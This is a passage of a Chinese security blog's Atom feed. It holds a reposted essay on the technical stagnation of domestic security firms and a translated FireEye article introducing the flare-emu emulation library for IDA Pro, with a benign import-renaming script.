    <content type="html"><![CDATA[<p>本文是一篇转载文章，作者的焦虑正好和我的焦虑类似，但是受限于本人的文字功底水平，怕写出来也会词不达意，因此转载了作者的原文来进行自勉。</p><p><strong>日后需要花点时间多想一想我们到底比别人优势在哪里，怎么利用我们的优势做出有辨识度的安全能力，怎么增厚壁垒扩大优势</strong></p><a id="more"></a><p><strong>本文转载自公众号<a href="https://mp.weixin.qq.com/s/8wvKP9fn9Thvp-QofnBZUg" target="_blank" rel="noopener">白帽汇赵武</a></strong></p><p>我一直比较焦虑，这跟我们公司业绩有没有翻倍没关系，跟我们拿没拿到融资没关系，跟我们的产品日活增加了多少没关系，跟我们公司加了多少人更加没有关系，因为我总觉得我们的技术还没有完成领先一代的升级。朋友问我说，什么叫领先一代的技术？我还没来得及想答案，另外的朋友又补充问题说，你需要花多长时间来完成你眼里领先一代的技术？<br>整个行业又何止是我们公司如此，我认为整个国内的安全公司都存在这个问题，只是大家未必都这么焦虑罢了。在我看来大家都还没有领先一代的技术，不管每个网络安全细分领域的所谓龙头企业怎么说，其他的一些企业都会不服气的站出来说我也有，这是典型的窝里横。</p><p>这里一个较为明显的特征就是，当你提出一个技术指标，友商会快速跟进，但是你又没有很好的办法证明你是对的他是错的，而且用户也不具备辨别的能力。所以大家就是拼宣传拼广告，你也没有杀手锏证明只有你有别人没有，大家都跟狗皮膏药一样相互贴着，甩也甩不掉，后来就变成了凑指标凑功能耍流氓的安然无恙，谁也打不败谁。<br>一个行业好不好，其实有一个很明显的特诊：你PK的是技术参数还是对美好事物的描述。最初级的永远是说我支持多少数据指标，这恰恰是行业没有突破的比较明显的特诊。真正意义上最好的效果是在哪个强需求点上非你不可。我这么说大家可能觉得有点模糊，那我举几个目前的例子好了：有企业敢对光刻机的市场吹牛吗？有企业能批量交付完全自主产权的7nm芯片吗？有企业能够宣称自己能够从生态上替换微软吗？</p><p>这就是领先一代的特征，所有的PR在这种实力面前都是无效的，更明确的衡量指标是：抛开政策要求不说，纯基于市场选择行为，老百姓或者企业在采购上愿意选择谁。所以说，在芯片领域国外是领先国内一代的，但是Intel跟AMD之间就不存在这个跨越，谁都打不服谁。</p><p>我们很多的技术都是这样，尤其是集中在网络安全这个领域，乍一想应该是有明显的阶梯的，实际上大量的“将就”，技术指标上<br>打赢国内友商就行，所以大家也说网络安全市场内卷。这不是废话嘛，你做了一堆垃圾，都在国内作威作福，都在忽悠客户。对内各种硬气，对外各种软，有本事把战线拉到别人的地盘去，与最顶尖的技术做PK，在一个市场化更加明显的环境里，让市场选择你，这才是真本事，那才叫领先了，至于是不是领先国外技术一代倒也未必，但是领先国内技术一代那是比较肯定的了。<br>回到我们自身，我们花了很长时间在做数据积累，我们也一直在等待量变到质变，我今天还是坚持要持续做最精细的数据积累，但是我把期望降低，我认为数据积累的量未必会改变用户认知，因为用户根本无从分辨，而真正能让用户感知到的是一种体验。换句话说，用户根本不参与评判，用户只是认为我想要做什么事情，用了你的产品就产生了美好，用户根本不需要关注参数指标。比如普通用户用电脑，他们能感知电脑卡不卡，风扇吵不吵，程序是不是都能装上，价格是不是能接受，至于i7还是锐龙用户分辨不了也不关心。但是你要是换成龙芯，用户就能快速感知，因为连一些游戏都跑不起来。<br>其实我看到了行业内有很多非常优秀的人才，他们有超强的天赋，在很短时间内快速达到了其他人难以企及的高度。于是很多企业给他们抛来了橄榄枝，高薪高职位。我看着他们开上了豪车，住上了大房子，开始学会了品酒品茶品咖啡，开始有人告诉他们要学会管理，学会做商务，学会了各类事物。他们的努力和能力当然配得上所有的这一切，只可惜的是快速就忘记了他们也没有来得及完成一种跨越式的技术输出，他们活成了别人眼里的“精英”阶层。太多的可能带领大家完成技术创新的人，在现实生活的优越感中，迷失了方向，他们不清楚作为天选之子他们神圣的使命败给了糖衣炮弹。</p><p>要完成我说的这种领先，就必须完成跨越式的创新，而要完成这种跨越式的创新，需要几个基本的条件：一是具有坚定的信念和使命感的创始团队，纯商人性质注定是不行的；二是顶尖的人才梯队，能够完成创新能力的快速实现试错；三是足够多的资源投入，只有足够多的资本和社会资源才能够支持人才梯队和长周期的研发。这三个只是基本的前提条件，不是必然条件，剩下来的就是时间。</p><p>老一辈的顶级科学家们花了一辈子的时间去寻找答案，创造了历史，也只不过是沧海一粟，仅仅能够完成一片拼图而已，我们为什么还想去走捷径？我们再想想爱因斯坦这辈子也没告诉人类宇宙的边缘是什么，马斯克可能在生命终结的那一刻也没能看到火星城市的建立，但是他们已经完成的成就已经是有目共睹，他们的技术已经领先一代甚至是两代，他们的思维就跑得更远了。所以，回到开头，如果说要对这种革新式的技术做一个时间限定，我希望像林俊德院士那样在生命最后一刻还在找寻答案。你翻过了一个山头，一定就会想翻另一个山头，就如他所表现的那样，休息时也要坐着，他担心躺下就再也起不来了。</p><p>我焦虑的是，我的智商不是最高的那一批，我们的技术还没有完成绝对的领先优势，我们的人才梯队距离顶尖还有很大差距，那种天才式的人才甚至看不上网络安全这个市值还不到万亿规模的领域。但是我又真切地看到了历史的机遇，无论从行业技术角度来看，还是在全球竞争力的角度来看，我们看到了机会，我们也整理了一系列突破的点，我也相信我一年能够完成一两个点的攻坚，耐不住要攻坚的创新点还有上百个，终其一生未必能完成一个行业最好技术落地的最基础的产品或者工具。我希望我们的工具在全球安全从业人员人手一套，我希望我们的产品在所有IT企业作为基础的第一款了解和使用的安全软件，我们希望我们的平台能够像Google一样的伟大，网络安全从我们这里开始。</p><p>我认为还是有机会的，只要我们完成技术的第一次突破，一次能够清晰划分实力的那一次蜕变。我们有了方向，也有了一定的资本，只是我们在人才梯队方面痛不欲生。希望突破早日到来！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是一篇转载文章，作者的焦虑正好和我的焦虑类似，但是受限于本人的文字功底水平，怕写出来也会词不达意，因此转载了作者的原文来进行自勉。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日后需要花点时间多想一想我们到底比别人优势在哪里，怎么利用我们的优势做出有辨识度的安全能力，怎么增厚壁垒扩大优势&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="我的思考" scheme="http://blog.wonderkun.cc/tags/%E6%88%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>用模拟执行实现Objective-C代码自动化分析</title>
    <link href="http://blog.wonderkun.cc/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://blog.wonderkun.cc/2020/03/02/用模拟执行实现Objective-C代码自动化分析/</id>
    <published>2020-03-02T04:01:27.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析"><a href="#火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析" class="headerlink" title="火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析"></a>火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析</h2><h3 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h3><!-- 京东安全开源的 [qiling](https://github.com/qilingframework/qiling) 是一个很不错的想法，但是唯一的问题在于它实现的东西太多，比较笨重。有的时候我仅仅想模拟几个函数的执行,操作比较麻烦，并且不太直观。所以我在github上一顿搜索，最终发现了这个 [flare-emu](https://github.com/fireeye/flare-emu) 完全满足我直观，简单的需求。 --><p>但是使用的时候发现它不支持python3，同时代码中 bytes 和 str 对象傻傻的分不清楚，所以不得不进行了一下修改，修改后的版本在<a href="https://github.com/wonderkun/flare-emu" target="_blank" rel="noopener">这里</a>(可能有些地方并没有修改完善，以后使用过程中发现问题再做修改吧)。下面就对官方的介绍文档进行了一个翻译。</p><a id="more"></a><p>原文链接: <a href="https://www.fireeye.com/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html" target="_blank" rel="noopener"> https://www.fireeye.com/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html</a></p><p>这是 FireEye 高级逆向工程团队公开的脚本系列的另一篇博文。今天我们分享一个新的  IDApython  库 - <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">flare-emu</a>,它依赖于 IDA pro和 Unicorn 仿真模拟框架，为 x86、x86_64、ARM和ARM64体系结构提供可脚本化的仿真功能，供逆向工程师使用。  除了这个库之外，我们还共享了一个使用它分析 Objective-C 代码的 IDAPython 脚本。请继续阅读以了解使用模拟器的一些创新的方法，这些方法可以帮你解决代码分析中遇到的问题，以及如何使用我们新的 IDAPython 库来节省您在此过程中的大量时间。</p><h3 id="为什么要模拟执行？"><a href="#为什么要模拟执行？" class="headerlink" title="为什么要模拟执行？"></a>为什么要模拟执行？</h3><p>如果你还没有使用模拟执行来解决代码分析中的问题，那你就已经跟不上潮流了。我将重点介绍它的一些优点和一些用例，以使您了解它的强大功能。仿真模拟是非常灵活的，并且当今可用的许多仿真框架（包括 Unicorn ）都是跨平台的。通过模拟执行，您可以选择要模拟执行的代码，并控制代码执行时的上下文信息。因为被模拟执行的代码无法访问运行它的操作系统的系统服务，所以几乎没有造成任何损坏的风险。所有这些优点使仿真成为临时实验，解决问题或自动化的绝佳选择。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li>解码/解密/解混淆/解压缩 - 在进行恶意代码分析时，你经常会遇到用于解码、解压缩、解密或者解混淆一些有用数据(如字符串或者其他的payload)的函数。如果是常用的算法，你可以通过人工分析或者使用 <a href="https://github.com/nihilus/IDA_Signsrch" target="_blank" rel="noopener">signsrch</a>之类的插件来解决，但是不幸的是，很多时候并不是这样的。然后，你要么打开调试器对样本进行插桩分析来解密数据，要么手动将函数转换为适合您当时需求的任何其他编程语言。这些选择可能很耗时且有一定的问题，具体取决于代码本身和要分析的样本的复杂性。此时，模拟执行通常可以为你提供更好的第三种选择。编写一个可以为您模拟执行功能的脚本将类似的功能提供给你，就好像您编写了该功能或正在从库中调用它一样。这样你就可以在不打开调试器的情况下，通过不同的输入重复使用相同的函数。这也适用于可以自解密的shellcode，你可以使用模拟器功能让代码自我解密。</li><li>数据跟踪 - 使用模拟器，您可以随时使用指令挂钩来停止和检查仿真上下文。将反汇编器和模拟器搭配，可以使你在关键指令上停止模拟并检查寄存器和内存的值。这样，您就可以在您感兴趣数据流过某个函数时对其进行标记。这里还有其他的几个有用的程序，正如以前在FLARE脚本系列的其他博客中介绍的那样，<a href="https://www.fireeye.com/blog/threat-research/2015/11/flare_ida_pro_script.html" target="_blank" rel="noopener">自动函数参数提取</a>和<a href="https://www.fireeye.com/blog/threat-research/2015/12/flare_script_series.html" target="_blank" rel="noopener">自动混淆字符串解码</a>,该技术可用于跟踪在整个程序中传递给给定函数的参数。函数参数跟踪是本文稍后介绍的Objective-C代码分析工具采用的技术之一。数据跟踪技术也可以用来跟踪C ++代码中的this指针，以便标记对象成员引用，或者标记从GetProcAddress / dlsym的调用返回的值，以便适当地重命名存储它们的变量。带来了很多可能性。</li></ul><h3 id="flare-emu-简介"><a href="#flare-emu-简介" class="headerlink" title="flare-emu 简介"></a>flare-emu 简介</h3><p> FLARE (FireEye 高级逆向工程团队)团队正在介绍一个IDApython的库 <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">flare-emu</a> ,该库将IDA Pro的二进制分析功能与Unicorn的仿真框架相结合，为用户提供了易用且灵活的脚本编写仿真模拟接口。flare-emu旨在处理所有内务处理，为其支持的体系结构设置灵活而强大的仿真器，以便您专注于解决代码分析问题。 当前，它提供了三种不同的接口来满足您的仿真需求，以及一系列相关的帮助程序和实用功能。</p><ol><li><p>emulateRange  - 该API用于在用户指定的上下文中模拟一系列指令或函数。它为各个指令以及遇到“call”指令时提供用户自定义的挂钩选项。用户可以决定模拟器是跳过还是调用函数中的代码。图1显示了 emulateRange 与指令和调用hook一起使用，以跟踪GetProcAddress调用的返回值，并将全局变量重命名为它们将指向的Windows API的名称。在此示例中，仅将其设置为从 0x401514 到 0x40153D 进行仿真。 该接口为用户提供了一种简单的方法来给寄存器和堆栈参数指定值。 如果指定了字节串，则将其写入仿真器的内存，并将指针写入寄存器或堆栈变量。 仿真后，用户可以使用 flare-emu 的其他的实用函数从仿真的内存或寄存器中读取数据，或者在flare-emu无法提供您所需的某些功能的情况下，使用返回的Unicorn仿真对象直接进行获取。</p><p>emulateSelection是对emulateRange函数的简单封装，可用于模拟IDA Pro中当前高亮显示的指令范围。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture1.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture1.png"></p></li></ol><p>​                         图1： emulateRange用于跟踪GetProcAddress的返回值</p><ol start="2"><li><p>iterate - 此API用于强制向下模拟执行函数中的特定分支，以达到给定目标。用户可以指定目标地址列表，也可以指定函数的地址（从中使用对该函数的交叉引用的列表）作为目标，并指定达到目标时的回调。无论仿真期间可能导致采用不同分支的条件如何，都将达到目标。图2展示了为了达到目标而不得不进行迭代的一组代码分支。 cmp指令设置的标志无关紧要。 像emulateRange API一样，可以提供了用户定义的挂钩的选项，既可以用于单独的指令，也可以用于遇到“call”指令时。iterate API的一个示例用法是用于本文前面提到的函数参数跟踪技术。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture2.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture2.png"></p></li></ol><p>​                                                                 图2：由 iterate  API确定的仿真路径，以便到达目标地址</p><ol start="3"><li><p>emulateBytes  - 该API提供了一种简单地模拟独立的shellcode的方法。 所提供的字节不会添加到IDB数据库中，而是直接照原样进行仿真。这对于准备仿真环境很有用,例如，flare-emu本身使用此API来操作Unicorn未公开的ARM64 CPU Model Specific Register（MSR）寄存器，以便启用 Vector Floating Point（VFP）指令和寄存器访问。 图3展示了为实现此目的的代码片段。 与emulateRange一样，如果flare-emu没有暴露用户所需的某些功能，则返回Unicorn仿真对象以供用户进一步探测。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture3.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture3.png"></p><p>​                                              图3：flare-emu使用emulateBytes为ARM64启用VFP</p></li></ol><h3 id="API-Hooking"><a href="#API-Hooking" class="headerlink" title="API-Hooking"></a>API-Hooking</h3><p> 如前所述，flare-emu 旨在让您轻松使用仿真来解决代码分析中的需求。模拟执行的一大痛点时对库函数调用的处理。flare-emu允许您选择需要跳过的call指令的同时，也支持你定义自己的hook函数来实现hook的函数被调用之后的特定功能。它自带有预定义的挂钩函数共80多个。这些函数包括许多常见的c运行时函数，这些函数将对你遇到的字符串和内存进行操作，以及与之对应的某些windows API。</p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>图4显示了一些代码块，这些代码块调用一个函数，该函数需要一个时间戳值并将其转换为字符串。 图5显示了一个简单的脚本，该脚本使用flare-emu的迭代API在每个被调用的位置打印传递给该函数的参数。 该脚本还模拟了一个简单的XOR解码功能，并输出结果解码后的字符串。 图6显示了脚本的结果输出。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture4.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture4.png"></p><p>​                                                                              图4： 调用时间戳转换函数</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture5.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture5.png"></p><p>​                                                                           图5： Simple example of flare-emu usage </p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture6.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture6.png"></p><p>​                                                                        图6： Output of script shown in Figure 5 </p><p>这是一个<a href="https://github.com/fireeye/flare-emu/blob/master/rename_dynamic_imports.py" target="_blank" rel="noopener">示例脚本</a>，该脚本使用flare-emu跟踪GetProcAddress的返回值并重命名它们相应存储的变量。 查看我们的自述文件以获取更多示例，并获得关于flare-emu的帮助。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 FireEye, Inc.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0, &lt;LICENSE-APACHE or</span></span><br><span class="line"><span class="comment"># http://apache.org/licenses/LICENSE-2.0&gt; or the MIT license &lt;LICENSE-BSD-3-CLAUSE or</span></span><br><span class="line"><span class="comment"># https://opensource.org/licenses/BSD-3-Clause&gt;, at your option. This file may not be</span></span><br><span class="line"><span class="comment"># copied, modified, or distributed except according to those terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: James T. Bennett</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># IDApython script that names global variables after their import names when dynamically resolved using GetProcAddress</span></span><br><span class="line"><span class="comment"># Point it to a target function (or somewhere within the function) to begin emulation from</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Dependencies:</span></span><br><span class="line"><span class="comment"># https://github.com/fireeye/flare-emu</span></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flare_emu</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeName</span><span class="params">(addr, name)</span>:</span></span><br><span class="line">    names = list(map(<span class="keyword">lambda</span> x: x[<span class="number">1</span>], list(idautils.Names())))</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    myname = name</span><br><span class="line">    <span class="keyword">while</span> myname <span class="keyword">in</span> names:</span><br><span class="line">        myname = name + <span class="string">"_%d"</span> % i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    idc.set_name(addr, myname, idc.SN_CHECK)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instructionHook</span><span class="params">(uc, address, size, userData)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        eh = userData[<span class="string">"EmuHelper"</span>]</span><br><span class="line">        <span class="keyword">if</span> (idc.print_insn_mnem(address) == <span class="string">"mov"</span> <span class="keyword">and</span></span><br><span class="line">                idc.get_operand_type(address, <span class="number">0</span>) == <span class="number">2</span> <span class="keyword">and</span></span><br><span class="line">                idc.get_name(idc.get_operand_value(address, <span class="number">0</span>))[:<span class="number">6</span>] == <span class="string">"dword_"</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"imp"</span> <span class="keyword">in</span> userData:</span><br><span class="line">                makeName(idc.get_operand_value(address, <span class="number">0</span>), userData[<span class="string">"imp"</span>])</span><br><span class="line">                <span class="keyword">del</span>(userData[<span class="string">"imp"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error in instructionHook: %s"</span> % str(err)</span><br><span class="line">        eh.stopEmulation(userData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callHook</span><span class="params">(address, argv, funcName, userData)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        eh = userData[<span class="string">"EmuHelper"</span>]</span><br><span class="line">        <span class="comment"># save last import string passed to a call to GetProcAddress</span></span><br><span class="line">        <span class="keyword">if</span> funcName == <span class="string">"GetProcAddress"</span>:</span><br><span class="line">            arg = eh.getEmuString(argv[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> len(arg) &gt; <span class="number">2</span>:</span><br><span class="line">                userData[<span class="string">"imp"</span>] = arg</span><br><span class="line">            <span class="comment"># for code that checks for a return value</span></span><br><span class="line">            eh.uc.reg_write(eh.regs[<span class="string">"ret"</span>], <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error in callHook: %s"</span> % str(err)</span><br><span class="line">        eh.stopEmulation(userData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    eh = flare_emu.EmuHelper()</span><br><span class="line">    sVa = idc.ida_kernwin.ask_str(<span class="string">"0"</span>, <span class="number">0</span>, <span class="string">"Enter the start address (hex)"</span>)</span><br><span class="line">    sVa = int(sVa, <span class="number">16</span>)</span><br><span class="line">    eVa = idc.ida_kernwin.ask_str(<span class="string">"0"</span>, <span class="number">0</span>, <span class="string">"Enter the end address (hex), specify 0 to emulate to end of function"</span>)</span><br><span class="line">    eVa = int(eVa, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> (sVa &gt;= idc.get_inf_attr(idc.INF_MIN_EA) <span class="keyword">and</span> sVa &lt;= idc.get_inf_attr(idc.INF_MAX_EA) <span class="keyword">and</span></span><br><span class="line">            (eVa == <span class="number">0</span> <span class="keyword">or</span> (eVa &gt;= idc.get_inf_attr(idc.INF_MIN_EA) <span class="keyword">and</span> eVa &lt;= idc.get_inf_attr(idc.INF_MAX_EA)))):</span><br><span class="line">        <span class="keyword">if</span> eVa == <span class="number">0</span>:</span><br><span class="line">            eVa = <span class="literal">None</span></span><br><span class="line">        mu = eh.emulateRange(sVa, eVa, instructionHook=instructionHook, callHook=callHook)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error: supplied addresses not within IDB address range"</span></span><br></pre></td></tr></table></figure><h3 id="介绍-objc2-analyzer"><a href="#介绍-objc2-analyzer" class="headerlink" title="介绍 objc2_analyzer"></a>介绍 objc2_analyzer</h3><p>(对object-c不太懂，不知道有没有说错的地方)</p><p>去年，我写了一篇博客文章向您介绍逆向macOS平台的Cocoa应用程序,文章地址在<a href="https://www.fireeye.com/blog/threat-research/2017/03/introduction_to_reve.html" target="_blank" rel="noopener">这里</a>,该帖子包括一个简短的入门文章，介绍如何在后台调用Objective-C方法，以及这如何对IDA Pro和其他反汇编工具中的交叉引用产生的不利影响。帖子中还介绍了一个名为objc2_xrefs_helper的IDAPython脚本，以帮助解决这些交叉引用问题。 如果您尚未阅读该博文，建议您在继续阅读本博文之前先阅读该博文，因为它提供了使用objc2_analyzer特别有用的上下文。objc2_xrefs_helper的主要缺点是，如果选择器名称含糊不清，则意味着两个或多个类实现了具有相同名称的方法，脚本无法确定引用的选择器在二进制文件中任何给定位置所属的类，所以修复交叉引用时不得不忽略这种情况。现在，有了仿真支持，情况就不再如此。 objc2_analyzer使用flare-emu中的iterate API以及执行Objective-C反汇编分析的指令和调用挂钩，以确定为二进制形式的 objc_msgSend 变量的每次调用传递的id和selector。脚本功能的示例如图7和图8所示。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture7.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture7.png"></p><p>​                                                   图7：运行objc2_analyzer之前的Objective-C IDB代码段</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture8.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture8.png"></p><p>​                                                  Figure 8: Objective-C IDB snippet after running objc2_analyzer </p><p>请注意已对引用选择器的指令进行了修补，以改为引用实现功能本身，以便于转换。 添加到每个call中的注释使分析更加容易。 还创建了来自实现功能的交叉引用，以指向指向引用它们的objc_msgSend调用，如图9所示。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture9.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture9.png"></p><p>​                                                         图9：为函数实现添加到IDB的交叉引用</p><p>应当注意，从7.0开始的每个IDA Pro版本都对Objective-C代码分析和处理进行了改进。 但是，在撰写本文时，IDA Pro的最新版本为7.2，使用该工具仍可消除一些缺点，并添加了非常有用的注释。 objc2_analyzer以及我们的其他IDA Pro插件和脚本可在我们的<a href="https://github.com/fireeye/flare-ida" target="_blank" rel="noopener">GitHub</a>页面上获得。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>flare-emu是一种灵活的工具，您可以在您的军械库中收藏它，它可以应用于各种代码分析问题。 在本博文中使用它提出并解决了几个示例问题，但这只是其应用可能性的一瞥。如果您没有尝试模拟解决代码分析问题的方法，我们希望您现在可以选择它。 而且，我们希望您能从使用这些新工具中受益匪浅！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析&quot;&gt;&lt;a href=&quot;#火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析&quot; class=&quot;headerlink&quot; title=&quot;火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析&quot;&gt;&lt;/a&gt;火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析&lt;/h2&gt;&lt;h3 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h3&gt;&lt;!-- 京东安全开源的 [qiling](https://github.com/qilingframework/qiling) 是一个很不错的想法，但是唯一的问题在于它实现的东西太多，比较笨重。有的时候我仅仅想模拟几个函数的执行,操作比较麻烦，并且不太直观。所以我在github上一顿搜索，最终发现了这个 [flare-emu](https://github.com/fireeye/flare-emu) 完全满足我直观，简单的需求。 --&gt;
&lt;p&gt;但是使用的时候发现它不支持python3，同时代码中 bytes 和 str 对象傻傻的分不清楚，所以不得不进行了一下修改，修改后的版本在&lt;a href=&quot;https://github.com/wonderkun/flare-emu&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这里&lt;/a&gt;(可能有些地方并没有修改完善，以后使用过程中发现问题再做修改吧)。下面就对官方的介绍文档进行了一个翻译。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
